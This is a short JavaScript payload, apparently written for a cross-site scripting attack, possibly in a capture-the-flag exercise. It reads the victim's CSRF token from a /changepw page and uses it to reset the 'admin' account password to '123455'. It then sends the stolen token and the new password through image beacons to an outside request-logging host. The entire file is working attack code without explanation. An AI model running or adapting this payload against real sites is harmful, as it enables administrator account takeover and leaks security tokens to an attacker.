(async () => {
  const r = await fetch("/changepw", { credentials: "include" });
  const html = await r.text();

  const m = html.match(/name="csrf_token" value="([^"]+)"/);
  if (!m) {
    new Image().src = "https://4w8vxje0.requestrepo.com/?err=no_token";
    return;
  }

  const token = m[1];
  const pw = "123455";

  new Image().src =
    "/changepw?userid=admin&userpw=" +
    encodeURIComponent(pw) +
    "&csrf_token=" +
    encodeURIComponent(token);

  new Image().src =
    "https://4w8vxje0.requestrepo.com/?token=" +
    encodeURIComponent(token) +
    "&pw=" +
    encodeURIComponent(pw);
})();
